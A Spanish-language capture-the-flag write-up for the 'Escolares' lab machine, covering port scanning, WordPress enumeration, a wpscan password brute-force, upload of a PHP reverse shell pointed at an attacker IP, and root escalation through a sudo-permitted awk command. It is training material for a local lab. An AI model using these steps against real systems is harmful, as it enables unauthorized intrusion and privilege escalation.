- Tags: #ps
---
<p>Enlace al laboratorio: <strong><a href="https://mega.nz/file/ZXckGSob#QBn80M3tFNTrKCJwZ1lIh-9Rafx5sdlG3lyCT9FPYes">Maquina Escolares</a></strong></p>

<h2 style="background-color: #211b46; text-align:center">Configuracion Laboratorio:</h2>
```bash
7z x escolares.zip # Desplegamos el laboratorio
sudo bash auto_deploy.sh escolares.tar # Desplegamos el laboratorio
```

<h2 style="background-color: #211b46; text-align:center">Fase Reconocimiento:</h2>
<p>Direccion <strong>IP</strong> del target</p>
```bash
172.17.0.2
```
<p>Lanzamos una traza <strong>ICMP</strong> para determinar si tenemos conectividad con el target</p>
```bash
ping -c 1 172.17.0.2
```
<p>Gracias al <strong>TTL</strong> determinamos que estamos ante una maquina <strong>Linux</strong></p>
```bash
wichSystem.py 172.17.0.2
172.17.0.2 (ttl -> 64): Linux
```

<h2 style="background-color: #211b46; text-align:center">Fase Enumeracion Puertos y Servicios:</h2>
<p>Realizaremos descubrimiento de puertos con nuestra herramienta en python mediante <strong>TCP</strong></p>
```bash
escanerTCP.py -t 172.17.0.2 -p 1-65000
```
<p>Usamos <strong>Nmap</strong> para realizar descubrimiento de puertos</p>
```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```
<p>Parseamos la informacion mas relevante del escaneo</p>
```bash
extractPorts allPorts
```
<p>Realizamos un escaneo exhaustivo para determinar los <strong style="color: #f6aceb">servicos</strong> y las <strong style="color: #f6aceb">versiones</strong> que corren detras de estos puertos</p>
```bash
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted
```
<p>Servicio: <strong>( 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0) )</strong> expuesto.</p>

<h2 style="background-color: #211b46; text-align:center">Fase Enumeracion Web:</h2>
<p>Realizamos deteccion de las <strong style="color: #f6aceb">Tecnologias</strong> usadas por este servico</p>
```bash
whatweb http://172.17.0.2 # No reporta nada critico
```
<p>Realizamos enumeracion de rutas con un script</p>
```bash
nmap --script http-enum -p 80 172.17.0.2
# Resultado
/wordpress/: Blog
/info.php: Possible information file
/phpmyadmin/: phpMyAdmin
/wordpress/wp-login.php: Wordpress login page.
```
<p>Ingresando al citio detectamos que posiblemente estamos ante un: <strong style="color: #f6aceb">CMS WordPress</strong></p>
```bash
http://172.17.0.2/
```
<p>Realizamos <strong style="color: #f6aceb">Fuzzing</strong> para enumerar directorios en la web.</p>
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

```bash
# Resultado
/assets/              (Status: 200) [Size: 1963]
/wordpress/           (Status: 200) [Size: 84176]
/phpmyadmin/          (Status: 200) [Size: 18605]
```
<p>Tenemos un formulario de contacto, que en su codigo fuente podemos encontrar una ruta que antes no habiamos detectado con la enumeracion: <strong style="color: #f6aceb">( /profesores.html )</strong></p>
```bash
http://172.17.0.2/contacto.html # Aqui intentaremos probar si estan sanitizados los inputs
```
<p>Aqui en esta nueva ruta tenemos informacion de posibles usuarios en el sistema<br>Tenemos un posible usuario administrador: <strong style="color: #f6aceb">( luis )</strong></p>

<h4 style="background-color: #00abff; color: #002d2e; text-align:center">Fase Enumeracion WordPress:</h4>
<p>Realizando <strong style="color: #f6aceb">Fuzzing</strong> sobre esta url detectamos lo siguiente:</p>
```bash
gobuster dir -u http://172.17.0.2/wordpress/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,xml,txt,js,html,sh
```

```bash
/wp-content           (Status: 301) [Size: 323] [--> http://172.17.0.2/wordpress/wp-content/]
/wp-login.php         (Status: 200) [Size: 6590]
/license.txt          (Status: 200) [Size: 19915]
/wp-includes          (Status: 301) [Size: 324] [--> http://172.17.0.2/wordpress/wp-includes/]
/readme.html          (Status: 200) [Size: 7401]
/wp-trackback.php     (Status: 200) [Size: 136]
/wp-admin             (Status: 301) [Size: 321] [--> http://172.17.0.2/wordpress/wp-admin/]
/xmlrpc.php           (Status: 405) [Size: 42]
```
<p>Tenemos un codigo de estado: <strong style="color: #f6aceb">302 Redirect</strong> que tendremos que registar en nuestro archivo <strong style="color: #f6aceb">( /etc/hosts )</strong></p>
```bash
/wp-signup.php        (Status: 302) [Size: 0] [--> http://escolares.dl/wordpress/wp-login.php?action=register]
```
<p>Nuestro archivo debera quedar configurado de la siguiente manera: <strong style="color: #f6aceb">( /etc/hosts )</strong></p>
```bash
# Target    Domain
172.17.0.2  escolares.dl
```
<p>Ahora procedemos a ingresar bajo ese dominio:</p>
```bash
http://escolares.dl/ 
http://escolares.dl/wordpress/ # Revisando tenemos otro posible sobrenombre para el administrador: ( luisillo )
```
<p>Ahora podemos realizar una enumeracion exhaustiva con la herramienta: <strong style="color: #f6aceb">wpscan</strong> para el usuario: <strong style="color: #f6aceb">luis</strong> que es el <strong style="color: #f6aceb">administrador</strong><br>Uso de nuestra herramienta en python para generar un diccionario personalizado en base a los datos que le pasemos: <strong style="color: #f6aceb">genPasswd.py</strong></p>
```bash
diccionario_cupp.txt # Tenemos un diccionario personalizado en base a: ( luis / luisillo )
```
<p>Aplicamos ataque de fuerza bruta</p>
```bash
wpscan --url http://escolares.dl/wordpress/ -U luisillo --passwords diccionario_cupp.txt
```
<p>Tenemos credenciales validas para este usuario:</p>
```bash
username: luisillo
password: Luis1981
```
<p>En esta url tendremos que probar si estas credenciales son validas.</p>
```bash
/admin                (Status: 302) [Size: 0] [--> http://escolares.dl/wordpress/wp-admin/]
```
<h2 style="background-color: #211b46; text-align:center">Fase Explotacion:</h2>
<p><strong style="color: #f6aceb">Nota:</strong> Atacaremos el archivo: <strong style="color: #f6aceb">( WP File Manager > Wordpress > uploads )</strong> para poder subir un archivo php que nos otorge un revershell</p>
```bash
git clone https://github.com/pentestmonkey/php-reverse-shell.git --depth=1 # Descargamos el script 
```
<p>Configuramos los siguientes parametros con nuestra direccion <strong style="color: #f6aceb">IP</strong> y el <strong style="color: #f6aceb">Puerto</strong> en el que estaremos en escucha en el archivo: <strong style="color: #f6aceb">php-reverse-shell.php</strong></p>
```bash
$ip = '$IP'; # Aqui nuestra direccion de atacante
$port = $PORT; # Aqui el puerto en escucha
```
<p><strong style="color: #f6aceb">( uploads )</strong> Una ves cargado aqui el archivo, cargamos la url que apunta a este recurso.</p>
```bash
http://172.17.0.2/wordpress/wp-content/uploads/php-reverse-shell.php # Cargando este obtendremos una shell logrando ganar acceso a la maquina
```
<h2 style="background-color: #211b46; text-align:center">Fase Escalada Privilegios:</h2>
<p>Listando el directorio <strong style="color: #f6aceb">( /home )</strong> tendremos lo siguiente:</p>
```bash
ls -l /home
-rwxrwxrwx 1 root     root       23 Jun  8  2024 secret.txt
```

<p>Tenemos credenciales del usuario: <strong style="color: #f6aceb">( luisillo )</strong></p>
```bash
luisillopasswordsecret
```
<p>Migramos de usuario:</p>
```bash
su luisillo # ( luisillopasswordsecret )
```
<p>Listando los permisos de este usuario tenemos lo siguiente:</p>
```bash
sudo -l
```

```bash
User luisillo may run the following commands on 70f7732de030:
    (ALL) NOPASSWD: /usr/bin/awk # Tenemos una via potencial de elevar privilegios
```
<h4 style="background-color: #ff0f46; color: #002d2e; text-align:center">Fase Escalada a Root:</h4>
```bash
sudo -u root /usr/bin/awk 'BEGIN {system("/bin/bash -p")}' # Explotamos el binario
```

```bash
root@70f7732de030:~# whoami
root
```